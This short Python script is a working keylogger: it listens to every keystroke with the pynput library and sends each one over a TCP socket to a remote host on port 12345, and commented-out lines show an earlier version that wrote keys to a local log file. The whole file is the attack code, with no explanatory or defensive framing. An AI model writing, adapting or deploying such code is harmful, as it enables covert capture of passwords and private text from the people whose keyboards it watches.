from pynput.keyboard import Key,Listener
import socket
host=''
port=12345
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
def on_press(key):
    
    my_str_as_bytes = str.encode(str(key))
    s.sendall(my_str_as_bytes)
    #f=open("simplelog.txt","a+")
    #f.write('{0} '.format(key))

with Listener(
    on_press=on_press) as listener:
    listener.join()

